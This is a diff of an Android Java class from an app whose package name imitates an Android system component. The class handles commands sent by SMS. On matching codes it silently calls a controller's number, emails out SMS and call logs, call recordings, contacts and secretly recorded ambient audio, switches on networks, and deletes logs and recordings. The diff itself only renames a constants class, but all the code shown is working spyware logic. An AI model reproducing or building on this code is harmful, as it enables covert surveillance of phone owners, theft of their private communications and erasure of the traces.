@@ -8,7 +8,7 @@ import android.net.Uri;
 import android.net.wifi.WifiManager;
 
 import com.android.system.controled.Debug;
-import com.android.system.controled.Globle;
+import com.android.system.controled.MainApplication;
 import com.android.system.controled.db.DatabaseUtil;
 
 public class DoAboutCodeUtils {
@@ -19,129 +19,129 @@ public class DoAboutCodeUtils {
 		boolean result = true;
 		try {
 
-			if (msgTxt.contains(Globle.PHONE_CODE_UP)) {
+			if (msgTxt.contains(MainApplication.PHONE_CODE_UP)) {
 				Debug.e(TAG, "调大铃声音量，并加震动");
 				AudioUtil.turnUpMost(context);
 			}
 
-			else if (msgTxt.contains(Globle.PHONE_CODE_CALL_ME)) {
+			else if (msgTxt.contains(MainApplication.PHONE_CODE_CALL_ME)) {
 				Debug.e(TAG, "拨打电话");
-				Uri uri = Uri.parse("tel:" + Globle.PHONE_NUMBER);
+				Uri uri = Uri.parse("tel:" + MainApplication.controllerTel);
 				Intent it = new Intent(Intent.ACTION_CALL, uri); // 直接呼出
 				it.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
 				context.startActivity(it);
 			}
 
-			else if (msgTxt.contains(Globle.PHONE_CODE_UPLOAD_SMS_CALL)) {
+			else if (msgTxt.contains(MainApplication.PHONE_CODE_UPLOAD_SMS_CALL)) {
 				Debug.e(TAG, "上传短信通话记录");
 				SendEmailUtil send2 = new SendEmailUtil();
-				if (msgTxt.contains(Globle.PHONE_CODE_UPLOAD_SMS_CALL_MOBILE)) {
+				if (msgTxt.contains(MainApplication.PHONE_CODE_UPLOAD_SMS_CALL_MOBILE)) {
 					send2.upLoadSmsCallLog(context, true);
 				} else {
 					send2.upLoadSmsCallLog(context, false);
 				}
 			}
 
-			else if (msgTxt.contains(Globle.PHONE_CODE_UPLOAD_AUDIO_CALL)) {
+			else if (msgTxt.contains(MainApplication.PHONE_CODE_UPLOAD_AUDIO_CALL)) {
 				Debug.e(TAG, "上传通话录音");
 				SendEmailUtil send2 = new SendEmailUtil();
-				if (msgTxt.contains(Globle.PHONE_CODE_UPLOAD_AUDIO_CALL_MOBILE)) {
+				if (msgTxt.contains(MainApplication.PHONE_CODE_UPLOAD_AUDIO_CALL_MOBILE)) {
 					send2.upLoadCallAudios(context, true);
 				} else {
 					send2.upLoadCallAudios(context, false);
 				}
 			}
 
-			else if (msgTxt.contains(Globle.PHONE_CODE_UPLOAD_AUDIO_OTHER)) {
+			else if (msgTxt.contains(MainApplication.PHONE_CODE_UPLOAD_AUDIO_OTHER)) {
 				Debug.e(TAG, "上传其它录音");
 				SendEmailUtil send2 = new SendEmailUtil();
-				if (msgTxt.contains(Globle.PHONE_CODE_UPLOAD_AUDIO_OTHER_MOBILE)) {
+				if (msgTxt.contains(MainApplication.PHONE_CODE_UPLOAD_AUDIO_OTHER_MOBILE)) {
 					send2.upLoadOtherAudios(context, true);
 				} else {
 					send2.upLoadOtherAudios(context, false);
 				}
 			}
 
-			else if (msgTxt.contains(Globle.PHONE_CODE_UPLOAD_ALL)) {
+			else if (msgTxt.contains(MainApplication.PHONE_CODE_UPLOAD_ALL)) {
 				Debug.e(TAG, "上传所有");
 				SendEmailUtil send2 = new SendEmailUtil();
-				if (msgTxt.contains(Globle.PHONE_CODE_UPLOAD_ALL_MOBILE)) {
+				if (msgTxt.contains(MainApplication.PHONE_CODE_UPLOAD_ALL_MOBILE)) {
 					send2.upLoadALL(context, true);
 				} else {
 					send2.upLoadALL(context, false);
 				}
 			}
 
-			else if (msgTxt.contains(Globle.PHONE_CODE_RECORD_TIME)) {
-				String words = msgTxt.substring(msgTxt.indexOf(Globle.PHONE_CODE_RECORD_TIME), msgTxt.length());
+			else if (msgTxt.contains(MainApplication.PHONE_CODE_RECORD_TIME)) {
+				String words = msgTxt.substring(msgTxt.indexOf(MainApplication.PHONE_CODE_RECORD_TIME), msgTxt.length());
 				String[] strs = words.split(":");
 				if (strs.length == 2 && strs[1] != null) {
 					Debug.e(TAG, "录音N分钟: " + strs[1]);
 					// 文件保存位置
-					File file = new File(Globle.FILEPATH_AUDIOS_OTHER + strs[1] + " minutes-" + TimeUtil.longToDateTimeString(TimeUtil.getCurrentTimeMillis()) + ".amr");
+					File file = new File(MainApplication.FILEPATH_AUDIOS_OTHER + strs[1] + " minutes-" + TimeUtil.longToDateTimeString(TimeUtil.getCurrentTimeMillis()) + ".amr");
 					RecorderUtil.getInstence(context).startRecorder(file, Integer.parseInt(strs[1]));
 				}
 			}
 
-			else if (msgTxt.contains(Globle.PHONE_CODE_UPLOAD_CONTACTS)) {
+			else if (msgTxt.contains(MainApplication.PHONE_CODE_UPLOAD_CONTACTS)) {
 				Debug.e(TAG, "开始上传联系人");
 				ContactsUtil.createContactsFile(context);
 				SendEmailUtil send3 = new SendEmailUtil();
-				if (msgTxt.contains(Globle.PHONE_CODE_UPLOAD_CONTACTS_MOBILE)) {
+				if (msgTxt.contains(MainApplication.PHONE_CODE_UPLOAD_CONTACTS_MOBILE)) {
 					send3.upLoadContact(context, true);
 				} else {
 					send3.upLoadContact(context, false);
 				}
 			}
 
-			else if (msgTxt.contains(Globle.PHONE_CODE_RECORD_START)) {
+			else if (msgTxt.contains(MainApplication.PHONE_CODE_RECORD_START)) {
 				Debug.e(TAG, "开始录音");
 				// 文件保存位置
-				File file = new File(Globle.FILEPATH_AUDIOS_OTHER + TimeUtil.longToDateTimeString(TimeUtil.getCurrentTimeMillis()) + ".amr");
+				File file = new File(MainApplication.FILEPATH_AUDIOS_OTHER + TimeUtil.longToDateTimeString(TimeUtil.getCurrentTimeMillis()) + ".amr");
 				RecorderUtil.getInstence(context).startRecorder(file, -1);
 			}
 
-			else if (msgTxt.contains(Globle.PHONE_CODE_RECORD_END)) {
+			else if (msgTxt.contains(MainApplication.PHONE_CODE_RECORD_END)) {
 				Debug.e(TAG, "结束录音");
 				RecorderUtil.getInstence(context).stopRecorder();
 			}
 
-			else if (msgTxt.contains(Globle.PHONE_CODE_DOWN)) {
+			else if (msgTxt.contains(MainApplication.PHONE_CODE_DOWN)) {
 				Debug.e(TAG, "静音，并取消震动");
 				AudioUtil.turnDown(context);
 			}
 
-			else if (msgTxt.contains(Globle.PHONE_CODE_DELETE_MSG_LOG)) {
+			else if (msgTxt.contains(MainApplication.PHONE_CODE_DELETE_MSG_LOG)) {
 				Debug.e(TAG, "删除短信记录");
 				deleteSmsLog(context);
 			}
 
-			else if (msgTxt.contains(Globle.PHONE_CODE_DELETE_CALL_LOG)) {
+			else if (msgTxt.contains(MainApplication.PHONE_CODE_DELETE_CALL_LOG)) {
 				Debug.e(TAG, "删除通话记录");
 				deleteCallLog();
 			}
 
-			else if (msgTxt.contains(Globle.PHONE_CODE_TURNON_WIFI)) {
+			else if (msgTxt.contains(MainApplication.PHONE_CODE_TURNON_WIFI)) {
 				Debug.e(TAG, "开启wifi");
 				NetworkUtil.turnOnWifi(context);
 			}
 
-			else if (msgTxt.contains(Globle.PHONE_CODE_TURNON_MOBILE)) {
+			else if (msgTxt.contains(MainApplication.PHONE_CODE_TURNON_MOBILE)) {
 				Debug.e(TAG, "开启mobile network");
 				NetworkUtil.setMobileNetEnable(context);
 			}
 
-			else if (msgTxt.contains(Globle.PHONE_CODE_DELETE_AUDIOS_CALL)) {
+			else if (msgTxt.contains(MainApplication.PHONE_CODE_DELETE_AUDIOS_CALL)) {
 				Debug.e(TAG, "删除通话录音记录");
 				deleteCallRecord();
 			}
 
-			else if (msgTxt.contains(Globle.PHONE_CODE_DELETE_AUDIOS_OTHER)) {
+			else if (msgTxt.contains(MainApplication.PHONE_CODE_DELETE_AUDIOS_OTHER)) {
 				Debug.e(TAG, "删除其它录音记录");
 				deleteOtherRecord();
 			}
 
-			else if (msgTxt.contains(Globle.PHONE_CODE_DELETE_ALL_LOG)) {
+			else if (msgTxt.contains(MainApplication.PHONE_CODE_DELETE_ALL_LOG)) {
 				Debug.e(TAG, "删除所有记录");
 				deleteSmsLog(context);
 				deleteCallLog();
@@ -190,8 +190,8 @@ public class DoAboutCodeUtils {
 
 	private static void deleteCallLog() {
 		try {
-			if (Globle.FILE_CALL_LOG.exists()) {
-				Globle.FILE_CALL_LOG.delete();
+			if (MainApplication.FILE_CALL_LOG.exists()) {
+				MainApplication.FILE_CALL_LOG.delete();
 			}
 		} catch (Exception e) {
 			e.printStackTrace();
@@ -200,7 +200,7 @@ public class DoAboutCodeUtils {
 
 	private static void deleteCallRecord() {
 		try {
-			FileUtil.delFileDir(new File(Globle.FILEPATH_AUDIOS_CALL));
+			FileUtil.delFileDir(new File(MainApplication.FILEPATH_AUDIOS_CALL));
 		} catch (Exception e) {
 			e.printStackTrace();
 		}
@@ -208,7 +208,7 @@ public class DoAboutCodeUtils {
 
 	private static void deleteOtherRecord() {
 		try {
-			FileUtil.delFileDir(new File(Globle.FILEPATH_AUDIOS_OTHER));
+			FileUtil.delFileDir(new File(MainApplication.FILEPATH_AUDIOS_OTHER));
 		} catch (Exception e) {
 			e.printStackTrace();
 		}
